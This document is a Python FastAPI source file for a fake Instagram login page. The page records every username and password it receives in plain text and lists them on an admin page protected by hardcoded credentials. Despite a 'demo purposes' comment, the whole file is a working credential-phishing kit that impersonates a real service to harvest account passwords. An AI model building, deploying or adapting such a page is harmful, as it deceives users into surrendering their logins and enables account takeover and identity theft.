from fastapi import FastAPI, Form, HTTPException
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles

app = FastAPI()

# Serve static files (if needed for future enhancements)
app.mount("/static", StaticFiles(directory="static"), name="static")

# In-memory store for logged-in credentials (for demo purposes)
login_attempts = []

@app.get("/", response_class=HTMLResponse)
async def read_login_page():
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Log In • Instagram</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
        <style>
            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
            }
            body {
                font-family: 'Arial', sans-serif;
                background-color: #fafafa;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                color: #262626;
            }
            .container {
                background-color: white;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
                padding: 40px;
                width: 350px;
                text-align: center;
            }
            .logo {
                font-size: 40px;
                font-weight: bold;
                margin-bottom: 20px;
                color: #262626;  /* Changed to black */
            }
            .input-container {
                margin-bottom: 15px;
            }
            .input-container input {
                width: 100%;
                padding: 12px;
                border: 1px solid #dbdbdb;
                border-radius: 5px;
                font-size: 14px;
                outline: none;
                transition: border-color 0.2s;
            }
            .input-container input:focus {
                border-color: #0095f6;
            }
            .login-btn {
                background-color: #0095f6;
                color: white;
                padding: 12px;
                border: none;
                border-radius: 5px;
                font-size: 16px;
                cursor: pointer;
                width: 100%;
                margin-top: 10px;
                transition: background-color 0.2s;
            }
            .login-btn:hover {
                background-color: #007bb5;
            }
            .divider {
                margin: 20px 0;
                border-top: 1px solid #dbdbdb;
                position: relative;
            }
            .divider:before {
                content: "OR";
                position: absolute;
                top: -10px;
                left: calc(50% - 15px);
                background: white;
                padding: 0 10px;
                font-size: 14px;
                color: #999;
            }
            .social-login {
                margin-bottom: 10px;
            }
            .footer {
                margin-top: 20px;
                font-size: 12px;
                color: #999;
            }
            .footer a {
                color: #0095f6;
                text-decoration: none;
            }
            .footer a:hover {
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">Instagram</div>
            <form action="/login" method="post">
                <div class="input-container">
                    <input type="text" name="username" placeholder="Username or email" required>
                </div>
                <div class="input-container">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            <div class="divider"></div>
            <div class="social-login">
                <button class="login-btn" style="background-color: #3897f0;">Log in with Facebook</button>
            </div>
            <div class="footer">
                <p>Don't have an account? <a href="#">Sign up</a></p>
            </div>
        </div>
    </body>
    </html>
    """

@app.post("/login")
async def login(username: str = Form(...), password: str = Form(...)):
    # Store the login attempt
    login_attempts.append({"username": username, "password": password})
    return f"<h1>Logged in with username: {username}</h1>"

@app.get("/view_logins", response_class=HTMLResponse)
async def view_logins():
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>View Logins</title>
    </head>
    <body>
        <h1>Admin Login</h1>
        <form action="/admin_view" method="post">
            <input type="text" name="admin_username" placeholder="Admin Username" required>
            <input type="password" name="admin_password" placeholder="Admin Password" required>
            <button type="submit">View Logins</button>
        </form>
    </body>
    </html>
    """

@app.post("/admin_view", response_class=HTMLResponse)
async def admin_view(admin_username: str = Form(...), admin_password: str = Form(...)):
    # Replace 'admin' and 'password' with your desired admin credentials
    if admin_username == "DZ.DEV" and admin_password == "20100514dzM@":
        logins_html = "<h1>Logged In Users</h1><ul>"
        for login in login_attempts:
            logins_html += f"<li>Username: {login['username']}, Password: {login['password']}</li>"
        logins_html += "</ul>"
        return logins_html
    else:
        raise HTTPException(status_code=403, detail="Invalid admin credentials")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="127.0.0.1", port=8000)
